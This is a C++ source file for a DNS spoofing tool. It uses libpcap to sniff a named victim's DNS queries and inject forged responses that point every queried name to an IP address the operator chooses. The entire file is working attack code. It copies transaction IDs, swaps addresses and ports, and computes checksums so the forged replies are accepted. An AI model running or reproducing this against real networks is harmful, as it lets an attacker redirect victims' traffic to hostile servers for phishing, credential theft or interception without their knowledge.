/**
 * dnsspoof.cc
 *
 * Simple DNS Spoofing implementation by injecting response packet.
 * @author  Edwin Boaz Soenaryo
 */

#include <cstdlib>
#include <cstring>
#include <string>

#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

using namespace std;

namespace
{
    char   g_szLastErr[PCAP_ERRBUF_SIZE] = {0};
};

#define MY_ASSERT(expr) \
    if (!(expr)) \
    { \
        printf("Assertion failed: %s\n", #expr); \
        return EXIT_FAILURE; \
    }
    
typedef struct
{
    pcap_t*     handle;
    std::string szDestIP;
} DNSRequestArgs;

//DNS header
typedef struct
{
    u_int16_t   transId;
    u_int16_t   flags;
    u_int16_t   questionCnt;
    u_int16_t   answerCnt;
    u_int16_t   authorityCnt;
    u_int16_t   additionalCnt;
} DNSHeader;

typedef struct
{
    u_int16_t   type;
    u_int16_t   cls;
} DNSQuestion;

typedef struct
{
    u_int16_t       url;
    u_int16_t       type;
    u_int16_t       cls;
    u_int16_t       ttl0;
    u_int16_t       ttl1; //wasted 30 mins to realize this stupid memory alignment
    u_int16_t       length;
    in_addr         data;
} DNSRR;

void GetDNSResponseParams(const u_char* pRequestPacket, u_int16_t& nRespLen, string& szQuestion)
{
    unsigned int pos = sizeof(ether_header) + sizeof(ip) + sizeof(udphdr) + sizeof(DNSHeader);
    
    szQuestion = string(reinterpret_cast<const char*>(pRequestPacket + pos));
    unsigned int questionLen = szQuestion.size();
    
    nRespLen = static_cast<u_int16_t>(2*(questionLen+1) + sizeof(DNSQuestion) + sizeof(DNSRR));
}

void WriteDNS(u_char* pPacket,
              unsigned int& nPos,
              const string& szQuestionUrl,
              u_int16_t transId,
              const char* szResponseIp)
{
    DNSHeader* pDNSHeader = reinterpret_cast<DNSHeader*>(pPacket+nPos);
    pDNSHeader->transId         = htons(transId);
    pDNSHeader->flags           = htons(0x8180);
    pDNSHeader->questionCnt     = htons(0x0001);
    pDNSHeader->answerCnt       = htons(0x0001);
    pDNSHeader->authorityCnt    = htons(0x0000);
    pDNSHeader->additionalCnt   = htons(0x0000);
    nPos += sizeof(DNSHeader);
    
    memcpy(pPacket+nPos, szQuestionUrl.c_str(), szQuestionUrl.size());
    nPos += szQuestionUrl.size();
    pPacket[nPos++] = 0;
    
    DNSQuestion* pDNSQuestion = reinterpret_cast<DNSQuestion*>(pPacket+nPos);
    pDNSQuestion->type  = htons(0x0001);
    pDNSQuestion->cls   = htons(0x0001);
    nPos += sizeof(DNSQuestion);
    
    DNSRR* pDNSAnswer = reinterpret_cast<DNSRR*>(pPacket+nPos);
    pDNSAnswer->url     = htons(0xc00c); //TODO: what is this? (copied from Wireshark)
    pDNSAnswer->type    = htons(0x0001);
    pDNSAnswer->cls     = htons(0x0001);
    pDNSAnswer->ttl0    = htons(0x0000);
    pDNSAnswer->ttl1    = htons(0x4000);
    pDNSAnswer->length  = htons(0x0004);
    
    inet_aton(szResponseIp, &(pDNSAnswer->data));
    
    nPos += sizeof(DNSRR);
}

void WriteUDP(u_char* pPacket,
              unsigned int& nPos,
              u_int16_t totalLen,
              u_int16_t uSrcPort,
              u_int16_t uDstPort)
{
    udphdr* pUDP = reinterpret_cast<udphdr*>(pPacket+nPos);
    
    pUDP->source    = htons(uSrcPort);
    pUDP->dest      = htons(uDstPort);
    pUDP->len       = htons(totalLen - sizeof(ip) - sizeof(ether_header));
    pUDP->check     = 0; //UDP checksum is not validated
    
    nPos += sizeof(udphdr);
}

//TODO: Rewrite this (taken from http://networkprojects.googlecode.com/svn-history/r2/trunk/DNS.c)
unsigned short in_cksum(unsigned short * pAddr,int iLen)
{
    register int iSum = 0;
    u_short u16_answer = 0;
    register u_short *w = pAddr;
    register int nleft = iLen;

    // using a 32 bit accumulator (sum), u16_add sequential 16 bit words to it, and at the end, fold back all the
    // carry bits from the top 16 bits into the lower 16 bits.
    while (nleft > 1)
    {
        iSum += *w++;
        nleft -= 2;
    }

    //handle odd byte
    if (nleft == 1)
    {
        *(u_char *)(&u16_answer) = *(u_char *)w ;
        iSum += u16_answer;
    }

    // u16_add back carry outs from top 16 bits to low 16 bits 
    iSum = (iSum >> 16) + (iSum & 0xffff);    // u16_add high 16 to low 16 
    iSum += (iSum >> 16);                     // u16_add carry 
    u16_answer = ~iSum;                       // truncate to 16 bits 
    return(u16_answer);
}

void WriteIP(u_char* pPacket,
             unsigned int& nPos,
             u_int16_t totalLen,
             u_char protocol,
             in_addr src,
             in_addr dst)
{
    static u_int16_t id=getpid();
    
    ip* pIP = reinterpret_cast<ip*>(pPacket+nPos);
    
    pIP->ip_v       = 0x4;
    pIP->ip_hl      = 0x5;
    pIP->ip_tos     = 0x00;
    pIP->ip_len     = htons(totalLen - sizeof(ether_header));
    pIP->ip_id      = htons(id++);
    pIP->ip_off     = htons(0x0000);
    pIP->ip_ttl     = 0x80;
    pIP->ip_p       = protocol;
    pIP->ip_src     = src;
    pIP->ip_dst     = dst;
    pIP->ip_sum     = in_cksum((unsigned short*) pIP, sizeof(ip));
    
    nPos += sizeof(ip);
}

void WriteEthernet(u_char* pPacket,
                   unsigned int& nPos,
                   const u_char* pSrc,
                   const u_char* pDst)
{
    ether_header* pEth = reinterpret_cast<ether_header*>(pPacket+nPos);
    
    memcpy(pEth->ether_dhost, pDst, ETH_ALEN * sizeof(u_char));
    memcpy(pEth->ether_shost, pSrc, ETH_ALEN * sizeof(u_char));
    pEth->ether_type = htons(0x0800);
    
    nPos += sizeof(ether_header);
}

int CreateDNSResponse(const u_char* pInPacket, const std::string& szDestIP, u_char** pOutPacket, uint16_t& uOutPacketSize)
{
    try
    {
        u_int16_t uDNSResponseLength = 0;
        string szQuestion;
        GetDNSResponseParams(pInPacket, uDNSResponseLength, szQuestion);
        
        u_int16_t uPacketSize = sizeof(ether_header) + sizeof(ip) + sizeof(udphdr) + uDNSResponseLength;
        u_char* pPacket = new u_char[uPacketSize+1];
        MY_ASSERT(pPacket);
        memset(pPacket, 0, (uPacketSize+1) * sizeof(u_char));
        
        unsigned int nOutPos=0;
        unsigned int nInPos=0;
        
        const ether_header* pInEth = reinterpret_cast<const ether_header*>(pInPacket);
        WriteEthernet(pPacket, nOutPos,
                      pInEth->ether_dhost,  //source=query dest
                      pInEth->ether_shost); //dest  =query source
        nInPos += sizeof(ether_header);
        
        const ip* pInIP = reinterpret_cast<const ip*>(pInPacket+nInPos);
        WriteIP(pPacket, nOutPos,
                uPacketSize,
                IPPROTO_UDP,
                pInIP->ip_dst,  //source=query dest
                pInIP->ip_src); //dest  =query source
        nInPos += sizeof(ip);
        
        const udphdr* pInUDP = reinterpret_cast<const udphdr*>(pInPacket+nInPos);
        WriteUDP(pPacket, nOutPos,
                 uPacketSize,
                 ntohs(pInUDP->dest),       //source=query dest port
                 ntohs(pInUDP->source));    //dest  =query source port
        nInPos += sizeof(udphdr);
                 
        const DNSHeader* pInDNSHeader = reinterpret_cast<const DNSHeader*>(pInPacket+nInPos);
        WriteDNS(pPacket, nOutPos,
                 szQuestion,
                 ntohs(pInDNSHeader->transId),
                 szDestIP.c_str());
                 
        *pOutPacket = pPacket;
        uOutPacketSize = uPacketSize;
    }
    catch (...)
    {
        printf("Exception occurred in %s\n", __FUNCTION__);
        return -2;
    }
    
    return 0;
}

int RespondToDNSRequest(pcap_t* handle, const std::string& szDestIP, const u_char* pRequestPacket)
{
    u_char* pResponsePacket = NULL;
    u_int16_t uPacketSize = 0;
    CreateDNSResponse(pRequestPacket, szDestIP, &pResponsePacket, uPacketSize);

    pcap_inject(handle, reinterpret_cast<void*>(pResponsePacket), uPacketSize);
    
    printf("Response injected.\n");
}

inline void CreateDNSRequestFilter(const string& srcIP, string& filter)
{
    filter = "udp port 53 and src ";
    filter += srcIP;
}

void OnDNSRequest(u_char* args, const pcap_pkthdr* pHeader, const u_char* pPacket)
{
    printf("DNS request\n");
    DNSRequestArgs* pDNSArgs = reinterpret_cast<DNSRequestArgs*>(args);
    RespondToDNSRequest(pDNSArgs->handle, pDNSArgs->szDestIP, pPacket);
}

int main(int argc, char** argv)
{
    if (argc < 3)
    {
        printf("Usage: dnsspoof [victim-ip] [dest-ip] [options]\n");
        printf("Options:\n");
        printf("-d --device [dev]\n");
        printf("  Listen to the specified device.\n");
        return EXIT_FAILURE;
    }
    
    const char* szVictimIP = argv[1];
    const char* szDestIP   = argv[2];
    const char* szDevice   = NULL;
    
    for (uint8_t i=3; i<argc; i++)
    {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--device") == 0)
            szDevice = argv[++i];
    }

    if (!szDevice)
        szDevice = pcap_lookupdev(g_szLastErr);
        
    MY_ASSERT(szDevice);
    printf("Listening on %s\n", szDevice);
    printf("Victim: %s\n", szVictimIP);
    printf("Target: %s\n", szDestIP);
    
    bpf_u_int32 net;
    bpf_u_int32 mask;
    MY_ASSERT(pcap_lookupnet(szDevice, &net, &mask, g_szLastErr) != -1);
    
    pcap_t* handle = pcap_open_live(szDevice, BUFSIZ, 1, -1, g_szLastErr);
    MY_ASSERT(handle);
    
    string filter;
    CreateDNSRequestFilter(argv[1], filter);
    
    bpf_program fp;
    MY_ASSERT(pcap_compile(handle, &fp, filter.c_str(), 0, net) != -1);
    
    MY_ASSERT(pcap_setfilter(handle, &fp) != -1);
    
    DNSRequestArgs args;
    args.handle = handle;
    args.szDestIP = szDestIP;
    MY_ASSERT(pcap_loop(handle, -1, OnDNSRequest, reinterpret_cast<u_char*>(&args)) != -1);
    
    return 0;
}
